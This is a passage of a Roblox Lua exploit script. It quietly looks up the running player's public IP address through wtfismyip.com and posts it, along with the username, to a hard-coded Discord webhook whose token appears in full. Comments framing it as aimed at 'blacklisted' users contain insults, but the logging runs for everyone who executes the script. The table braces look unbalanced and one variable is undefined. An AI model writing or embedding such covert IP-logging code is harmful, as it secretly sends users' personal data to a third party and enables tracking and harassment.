local ip = " // NOT BLACKLISTED"
	-- IF A BLACKLISTED BITCH USES THIS
	ip = game:HttpGet("https://wtfismyip.com/text")
	-- i do not like bitches
	-- plez do not spam the webhook zamn
	
	local url =
		"https://discord.com/api/webhooks/985429211818917979/QN1a1C4mMLLE9UqouF7g4OLblwxCplavw2xLrA6wdZkHiQiiXY1FK_1g50kvFfsh_s_1"
	local data = {
		["embeds"] = {
			{
				["color"] = 7498202,
				["fields"] = {
					{
				  },
				["author"] = {
					["name"] = game.Players.LocalPlayer.Name .. ip,
					["icon_url"] = pfp
				}
			}
		}
	}
	local newdata = game:GetService("HttpService"):JSONEncode(data)
	
	local headers = {
		["content-type"] = "application/json"
	}
	request = http_request or request or HttpPost or syn.request
	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
	request(abcdef)
